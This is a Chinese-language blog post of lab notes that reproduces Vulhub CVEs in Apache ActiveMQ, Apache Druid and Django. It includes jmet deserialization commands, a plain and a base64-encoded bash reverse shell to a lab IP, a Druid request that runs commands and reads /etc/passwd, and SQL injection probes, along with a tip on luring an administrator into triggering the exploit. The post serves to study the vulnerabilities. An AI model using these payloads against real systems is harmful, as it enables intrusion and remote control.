<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="activemq                           CVE-2015-5254       Apache ActiveMQ 5.x 5.13.0 之前的安全漏洞，程序造成的漏洞不限制代理中可以序列化的类。远程攻击者可以使一个特殊的序列化 Java 消息服务 (JMS) ObjectMessage 对象利用此漏洞执行任意代码。  点击“Man">
<meta property="og:type" content="article">
<meta property="og:title" content="Vulhub-学习">
<meta property="og:url" content="https://pidan-007.github.io/2024/05/30/Vulhub/index.html">
<meta property="og:site_name" content="PiDan-007">
<meta property="og:description" content="activemq                           CVE-2015-5254       Apache ActiveMQ 5.x 5.13.0 之前的安全漏洞，程序造成的漏洞不限制代理中可以序列化的类。远程攻击者可以使一个特殊的序列化 Java 消息服务 (JMS) ObjectMessage 对象利用此漏洞执行任意代码。  点击“Man">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241525117.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241525928.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241611117.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241612138.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241612256.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241614612.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241648070.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241649371.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251038092.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251104222.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251104910.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251120064.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271517616.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271519833.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407040945677.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041007672.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041310261.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041311171.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041329422.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041313235.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041316012.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041343715.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041345637.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031333548.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021430509.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021501909.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031014998.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031014134.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031015391.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031016244.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031017167.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011522226.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011641518.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011643580.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011715518.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011718765.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021413886.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021413420.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271554889.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271555671.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271556761.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271558440.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271558763.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271600653.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271601362.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271651353.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090933638.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090935420.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090945972.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406140947337.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141104305.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141106878.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281409231.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281410618.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281425890.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281426935.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281430135.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281013276.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281034320.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406281023041.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141441706.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141442447.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141444227.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141511781.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141518652.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141601788.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141606314.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141608837.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141612434.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141640088.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141641215.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406141707487.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406170918837.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406170911203.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171448951.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171501559.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171555374.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171603184.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171619794.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171630268.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302030232.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302023728.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302029680.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302040219.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302041342.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405310920378.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311120287.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302043378.png">
<meta property="article:published_time" content="2024-05-30T05:34:20.000Z">
<meta property="article:modified_time" content="2024-07-09T06:54:43.034Z">
<meta property="article:author" content="PiDan-007">
<meta property="article:tag" content="Vulhub靶场练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241525117.png"><title>Vulhub-学习 | PiDan-007</title><link ref="canonical" href="https://pidan-007.github.io/2024/05/30/Vulhub/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PiDan-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Vulhub-学习</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-09</span></span></div></header><div class="post-body">
        <h1 id="activemq"   >
          <a href="#activemq" class="heading-link"><i class="fas fa-link"></i></a><a href="#activemq" class="headerlink" title="activemq"></a>activemq</h1>
      
        <h2 id="CVE-2015-5254"   >
          <a href="#CVE-2015-5254" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2015-5254" class="headerlink" title="CVE-2015-5254"></a>CVE-2015-5254</h2>
      <p>Apache <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ActiveMQ&spm=1001.2101.3001.7020" >ActiveMQ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 5.x 5.13.0 之前的安全漏洞，程序造成的漏洞不限制代理中可以序列化的类。远程攻击者可以使一个特殊的序列化 Java 消息服务 (JMS) ObjectMessage 对象利用此漏洞执行任意代码。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241525117.png" alt="image-20240624152537048"></p>
<p>点击“Manage ActiveMQ broker”，输入admin/admin登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241525928.png" alt="image-20240624152522850"></p>
<p>下载jmet工具</p>
<p>jmet是一个java写的工具，原理是使用ysoserial生成Payload并发送</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br></pre></td></tr></table></div></figure>

<p>执行（使用 Java 8 或 Java 9，这些版本仍然支持 <code>sun.reflect.Reflection</code> 类）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241611117.png" alt="image-20240624161156059"></p>
<p>(这里因为kali上无法安装jdk-8所以切换成了ubuntu)</p>
<p>网页输入/queuesjsp，查看队列进程</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241612138.png" alt="image-20240624161211067"></p>
<p>点击”event”，看到这里的ID与执行后的ID一致</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241612256.png" alt="image-20240624161255198"></p>
<p>点击查看这条消息即可触发命令执行</p>
<p>连接docker的shell</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker <span class="built_in">exec</span> -i </span><br><span class="line">sudo docker <span class="built_in">exec</span> -i 容器id /bin/bash</span><br></pre></td></tr></table></div></figure>

<p>成功创建success文件，说明实现命令执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241614612.png" alt="image-20240624161451574"></p>
<p>将命令替换成弹shell语句再利用</p>
<p>先开启监听，监听端口号设为19999</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 19999</span><br></pre></td></tr></table></div></figure>

<p>bash反弹命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.88.130/19999 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>

<p>所以执行命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; /dev/tcp/192.168.239.128/19999 0&gt;&amp;1&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></div></figure>

<p>但是没成功，需要将反弹命令进行base64编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241648070.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjEzMC8xOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></div></figure>

<p>再次点击消息以执行命令</p>
<p>成功连接到shell</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241649371.png" alt="image-20240624164908325"></p>
<p>ps：点击消息并触发漏洞这个过程需要管理员权限，复现之所以成功是因为登录时就是使用的管理员账号，在没有密码的情况下，可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>

        <h2 id="CVE-2022-41678"   >
          <a href="#CVE-2022-41678" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2022-41678" class="headerlink" title="CVE-2022-41678"></a>CVE-2022-41678</h2>
      <p>Apache ActiveMQ 在5.16.5, 5.17.3版本及以前，后台Jolokia存在一处任意文件写入导致的远程代码执行漏洞。</p>
<p>docker启动后访问<code>http://your-ip:8161</code>，然后输入账号密码admin/admin，登录后台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251038092.png" alt="image-20240625103815968"></p>
<p>登录之后抓包</p>
<p>访问接口<code>/api/jolokia/list</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251104222.png" alt="image-20240625110457176"></p>
<p>Origin为空，那么添加Origin值为<code>http://your-ip:8161</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /api/jolokia/list HTTP/1.1</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Origin:http://your-ip:8161</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251104910.png" alt="image-20240625110434790"></p>
<p>“org.apache.logging.log4j2”:{“component=Loggers,name=org.apache.xbean,type=6ddf90b0”</p>
<p>访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/jolokia/ HTTP/1.1</span><br><span class="line">Host: your-ip:8161</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Origin: http://your-ip:8161</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 131</span><br><span class="line">&#123;&quot;type&quot;: &quot;exec&quot;, &quot;mbean&quot;: &quot;org.apache.logging.log4j2:type=6ddf90b0&quot;, &quot;operation&quot;: &quot;setConfigText&quot;, &quot;arguments&quot;: [&quot;xml&quot;, &quot;utf-8&quot;]&#125;</span><br></pre></td></tr></table></div></figure>

<p>状态为200，可以证明漏洞存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406251120064.png" alt="image-20240625112034008"></p>
<p>进行注入</p>

        <h1 id="Adminer"   >
          <a href="#Adminer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Adminer" class="headerlink" title="Adminer"></a>Adminer</h1>
      
        <h2 id="CVE-2021-21311"   >
          <a href="#CVE-2021-21311" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2021-21311" class="headerlink" title="CVE-2021-21311"></a>CVE-2021-21311</h2>
      
        <h1 id="apache-druid"   >
          <a href="#apache-druid" class="heading-link"><i class="fas fa-link"></i></a><a href="#apache-druid" class="headerlink" title="apache-druid"></a>apache-druid</h1>
      
        <h2 id="CVE-2021-25646"   >
          <a href="#CVE-2021-25646" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2021-25646" class="headerlink" title="CVE-2021-25646"></a>CVE-2021-25646</h2>
      <p>Apache Druid包括执行嵌入在各种类型请求中的用户提供的JavaScript代码的能力。这个功能是为了在可信环境下使用，并且默认是禁用的。然而，在Druid 0.20.0及以前的版本中，攻击者可以通过发送一个恶意请求使Druid用内置引擎执行任意JavaScript代码，而不管服务器配置如何，这将导致代码和命令执行漏洞。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271517616.png" alt="image-20240627151736455"></p>
<p>抓包，将数据包修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler HTTP/1.1</span><br><span class="line">Host: your-ip:8888</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: adminer_version=4.8.1; adminer_permanent=</span><br><span class="line">If-Modified-Since: Thu, 08 Oct 2020 21:58:58 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 912</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;:&quot;index&quot;,</span><br><span class="line">    &quot;spec&quot;:&#123;</span><br><span class="line">        &quot;ioConfig&quot;:&#123;</span><br><span class="line">            &quot;type&quot;:&quot;index&quot;,</span><br><span class="line">            &quot;firehose&quot;:&#123;</span><br><span class="line">                &quot;type&quot;:&quot;local&quot;,</span><br><span class="line">                &quot;baseDir&quot;:&quot;/etc&quot;,</span><br><span class="line">                &quot;filter&quot;:&quot;passwd&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;dataSchema&quot;:&#123;</span><br><span class="line">            &quot;dataSource&quot;:&quot;test&quot;,</span><br><span class="line">            &quot;parser&quot;:&#123;</span><br><span class="line">                &quot;parseSpec&quot;:&#123;</span><br><span class="line">                &quot;format&quot;:&quot;javascript&quot;,</span><br><span class="line">                &quot;timestampSpec&quot;:&#123;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;dimensionsSpec&quot;:&#123;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;function&quot;:&quot;function()&#123;var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\&quot;sh\&quot;,\&quot;-c\&quot;,\&quot;id\&quot;]).getInputStream()).useDelimiter(\&quot;\\A\&quot;).next();return &#123;timestamp:123123,test: a&#125;&#125;&quot;,</span><br><span class="line">                &quot;&quot;:&#123;</span><br><span class="line">                    &quot;enabled&quot;:&quot;true&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;samplerConfig&quot;:&#123;</span><br><span class="line">        &quot;numRows&quot;:10</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271519833.png" alt="image-20240627151914774"></p>
<p>证明漏洞存在</p>

        <h1 id="django"   >
          <a href="#django" class="heading-link"><i class="fas fa-link"></i></a><a href="#django" class="headerlink" title="django"></a>django</h1>
      
        <h2 id="Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）"   >
          <a href="#Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）" class="headerlink" title="Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）"></a>Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）</h2>
      <p>在数据库函数<code>Trunc()</code>和<code>Extract()</code>中存在SQL注入漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407040945677.png" alt="image-20240704094545597"></p>
<p>这是我访问两次后的界面</p>
<p>这个页面使用了Trunc函数来聚合页面点击数量</p>
<p>传入<code>date</code>参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?date=1&#x27;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041007672.png" alt="image-20240704100733615"></p>
<p>说明存在SQL漏洞</p>

        <h2 id="Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）"   >
          <a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="headerlink" title="Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）"></a>Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041310261.png" alt="image-20240704131058145"></p>
<p>访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vuln</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041311171.png" alt="image-20240704131156126"></p>
<p>当<code>order_by</code>的传入参数中包含<code>.</code>时，可进行SQL注入，但需要正确的列名，可以通过猜测<code>id, _id</code>或输入错误的列名，从报错信息中得到列名</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041329422.png" alt="image-20240704132944373"></p>
<p>构造参数<code>order=-id</code>，会得到根据id降序排列的结果</p>
